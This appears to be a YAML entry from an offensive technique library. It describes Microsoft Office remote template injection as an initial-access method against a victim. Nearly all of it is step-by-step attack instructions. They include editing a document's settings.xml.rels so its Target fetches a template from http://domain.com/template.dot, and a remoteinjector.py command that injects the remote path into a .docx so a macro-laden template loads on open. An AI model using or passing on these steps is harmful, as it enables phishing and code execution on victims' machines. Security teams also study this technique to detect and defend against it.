title: MS Office - Remote Template Injection
category: 
  - AD:
    - Delivery:
      - Payloads
tactic: Initial Access
tags: []

description: 
  Remote Template Injection is a technique where an attacker sends a benign document to a victim, 
  which downloads and loads a malicious template.  This template may hold a macro, leading to code execution.

references:
  - https://github.com/JohnWoodman/remoteinjector

steps:
  - description: Create a new office document using a default template

  - description: Change the template to a remote path
    options:
      - tool: 7-Zip
        usage: |
          7-Zip > Open archive.  Navigate to word > _rels, right-click on settings.xml.rels and select Edit.

          Scroll right until you see the Target entry and modify it:
          Target="http://domain.com/template.dot"

      - tool: remoteinjector.py
        usage: |
          python3 remoteinjector.py -w http://domain.com/template.dot /mnt/c/Payloads/document.docx
